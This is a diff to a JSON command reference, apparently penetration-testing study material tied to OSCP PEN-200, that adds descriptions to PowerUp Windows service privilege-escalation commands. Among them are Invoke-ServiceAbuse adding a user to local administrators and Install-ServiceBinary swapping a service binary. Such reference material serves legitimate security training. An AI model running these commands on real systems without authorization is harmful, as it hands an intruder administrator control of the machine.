@@ -211,15 +211,18 @@
   "variations": [
     {
       "label": "PowerUp auto-abuse",
-      "command": "Invoke-ServiceAbuse -Name '<service>' -Command 'net localgroup administrators <user> /add'"
+      "command": "Invoke-ServiceAbuse -Name '<service>' -Command 'net localgroup administrators <user> /add'",
+      "description": "Exploits a vulnerable Windows service using PowerUp. Replaces the service binary or modifies its configuration to execute a payload as SYSTEM when the service restarts."
     },
     {
       "label": "PowerUp writable-path check (OSCP PEN-200 Ch16)",
-      "command": "Get-ModifiablePath -Path <service_binary_or_dir>   # PowerUp: test if current user can write the path"
+      "command": "Get-ModifiablePath -Path <service_binary_or_dir>   # PowerUp: test if current user can write the path",
+      "description": "PowerUp writable-path check (OSCP PEN-200 Ch16). See the command syntax for exact parameters and flags."
     },
     {
       "label": "PowerUp binary replace (OSCP PEN-200 Ch16)",
-      "command": "Install-ServiceBinary -Name '<service>'   # PowerUp: swap the service binary for one that adds a local admin"
+      "command": "Install-ServiceBinary -Name '<service>'   # PowerUp: swap the service binary for one that adds a local admin",
+      "description": "PowerUp binary replace (OSCP PEN-200 Ch16). See the command syntax for exact parameters and flags."
     }
   ],
   "steps": [
